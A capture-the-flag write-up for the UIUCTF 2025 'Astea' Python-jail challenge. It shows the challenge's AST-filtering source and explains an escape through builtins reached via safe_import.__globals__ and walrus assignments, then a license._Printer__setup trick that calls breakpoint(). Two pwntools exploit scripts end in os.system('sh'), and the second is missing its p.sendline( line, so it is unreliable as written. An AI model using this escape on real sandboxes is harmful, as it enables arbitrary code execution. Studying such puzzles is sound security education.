# UIUCTF 2025 Astea

```python
import ast

def safe_import():
  print("Why do you need imports to make tea?")

def safe_call():
  print("Why do you need function calls to make tea?")

class CoolDownTea(ast.NodeTransformer):
  def visit_Call(self, node: ast.Call) -> ast.AST:
    return ast.Call(func=ast.Name(id='safe_call', ctx=ast.Load()), args=[], keywords=[])
  
  def visit_Import(self, node: ast.AST) -> ast.AST:
    return ast.Expr(value=ast.Call(func=ast.Name(id='safe_import', ctx=ast.Load()), args=[], keywords=[]))
  
  def visit_ImportFrom(self, node: ast.ImportFrom) -> ast.AST:
    return ast.Expr(value=ast.Call(func=ast.Name(id='safe_import', ctx=ast.Load()), args=[], keywords=[]))
  
  def visit_Assign(self, node: ast.Assign) -> ast.AST:
    return ast.Assign(targets=node.targets, value=ast.Constant(value=0))
  
  def visit_BinOp(self, node: ast.BinOp) -> ast.AST:
    return ast.BinOp(left=ast.Constant(0), op=node.op, right=ast.Constant(0))
  
code = input('Nothing is quite like a cup of tea in the morning: ').splitlines()[0]

cup = ast.parse(code)
cup = CoolDownTea().visit(cup)
ast.fix_missing_locations(cup)

exec(compile(cup, '', 'exec'), {'__builtins__': {}}, {'safe_import': safe_import, 'safe_call': safe_call})
```

Requirements:

1. No function call: Use `f"{license}" for license._Printer__setup in [function_to_call]]` to call `function_to_call`
2. No builtins: Use `.__builtins__` of the given function to access builtins dict, or `.__globals__["__builtins__"]` of the given function to access builtins module
3. No assignment: Use `[a:=b]` for assignment

Inspired by [Pyjail Cheatsheet](https://shirajuki.js.org/blog/pyjail-cheatsheet/#running-functions-and-methods-without-parenthesis).

We want to call `breakpoint()`, so:

1. Get builtins from `safe_import`: `builtins = safe_import.__globals__["__builtins__"]`, to avoid assignment, use `[builtins:=safe_import.__globals__["__builtins__"]]`; alternatively, use `[builtins:=safe_import.__builtins__]` which is a dict instead of module
2. Get license and breakpoint from builtins module: `[...,breakpoint:=builtins.breakpoint,license:=builtins.license]`, or from builtins dict: `[...,breakpoint:=builtins["breakpoint"],license:=builtins["license"]]`
3. Call breakpoint via `license._Printer__setup`: `[f"{license}" for license._Printer__setup in [breakpoint]]`

Attack script using builtins module `safe_import.__globals__["__builtins__"]`:

```python
from pwn import *

context(log_level="debug")

p = process(["python3", "astea.py"])
p.recvuntil(b"morning:")
p.sendline(
    '[builtins:=safe_import.__globals__["__builtins__"],breakpoint:=builtins.breakpoint,license:=builtins.license,[f"{license}" for license._Printer__setup in [breakpoint]]]'.encode()
)
p.recvuntil(b"(Pdb) ")
p.sendline(b"import os")
p.sendline(b"os.system('sh')")

p.interactive()
```

Using builtins dict `safe_import.__builtins__`:

```python
from pwn import *

context(log_level="debug")

p = process(["python3", "astea.py"])
p.recvuntil(b"morning:")
    #'[builtins:=safe_import.__globals__["__builtins__"],breakpoint:=builtins.breakpoint,license:=builtins.license,[f"{license}" for license._Printer__setup in [breakpoint]]]'.encode()
    '[builtins:=safe_import.__builtins__,breakpoint:=builtins["breakpoint"],license:=builtins["license"],[f"{license}" for license._Printer__setup in [breakpoint]]]'.encode()
)
p.recvuntil(b"(Pdb) ")
p.sendline(b"import os")
p.sendline(b"os.system('sh')")

p.interactive()
```

What is `license._Printer__setup`?

```python
>>> type(license)
<class '_sitebuiltins._Printer'>
>>> license._Printer__setup
<bound method _Printer.__setup of Type license() to see the full license text>
```

It corresponds to `_setup(self)` function of `class _Printer` in [_sitebuiltins.py](https://github.com/python/cpython/blob/811acc85d5b001e0bef6ac2e6b499e7c4f149262/Lib/_sitebuiltins.py#L44). It is called when we convert `license` to `str`:

```python
def __repr__(self):
    self.__setup() # <- calls license._Printer__setup
    if len(self.__lines) <= self.MAXLINES:
        return "\n".join(self.__lines)
    else:
        return "Type %s() to see the full %s text" % ((self.__name,)*2)
```
